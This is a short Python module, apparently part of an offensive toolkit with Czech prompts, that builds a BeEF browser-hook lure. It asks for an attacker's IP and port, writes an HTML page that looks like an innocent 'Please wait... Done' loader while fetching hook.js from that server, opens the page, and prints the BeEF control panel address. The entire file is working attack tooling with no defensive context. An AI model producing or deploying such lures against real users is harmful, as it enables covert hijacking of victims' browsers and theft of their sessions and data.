# modules/hook.py
"""
BeEF hook: vygeneruje HTML s <script src="http://IP:PORT/hook.js">.
"""
import ipaddress
import os
import webbrowser

from colorama import Fore


def run():
    while True:
        raw = input("BeEF IP:port (napr. 192.168.1.10:3000): ").strip()
        if _valid_host_port(raw):
            break
        print(Fore.RED + "Neplatny format. Zadej IP:port.")

    html = f"""<!DOCTYPE html>
<html><head><title>Loading</title></head>
<body>
<h3>Please wait...</h3>
<script src="http://{raw}/hook.js"></script>
<script>
setTimeout(function(){{
  document.body.innerHTML='<h2>Done</h2>';
}}, 3000);
</script>
</body></html>"""

    path = os.path.abspath("beef_hook.html")
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)

    webbrowser.open("file:///" + path.replace("\\", "/"))
    print(Fore.GREEN + f"[+] Otevreno v prohlizeci")
    print(Fore.YELLOW + f"[*] BeEF panel: http://{raw}/ui/panel")


def _valid_host_port(s):
    if ":" not in s:
        return False
    host, port = s.rsplit(":", 1)
    try:
        ipaddress.ip_address(host)
        port_i = int(port)
    except ValueError:
        return False
    return 0 < port_i < 65536